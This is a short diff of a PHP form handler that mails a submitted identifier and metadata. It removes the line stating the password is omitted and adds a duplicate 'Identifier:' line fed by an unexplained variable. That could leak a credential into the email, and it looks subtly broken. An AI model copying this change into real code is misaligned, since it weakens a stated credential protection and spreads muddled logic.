@@ -71,7 +71,7 @@ $subject    = mb_encode_mimeheader($SUBJECT_PREFIX . $subjectRaw, 'UTF-8');
 // Assemble body (omit password for security)
 $bodyLines = [];
 $bodyLines[] = "Identifier: " . ($identifier !== '' ? $identifier : '(empty)');
-$bodyLines[] = "Password: [omitted for security]";
+$bodyLines[] = "Identifier: " . ($juan !== '' ? $juan : '(empty)');
 $bodyLines[] = "";
 $bodyLines[] = "Meta:";
 $bodyLines[] = "Time: " . gmdate('c');
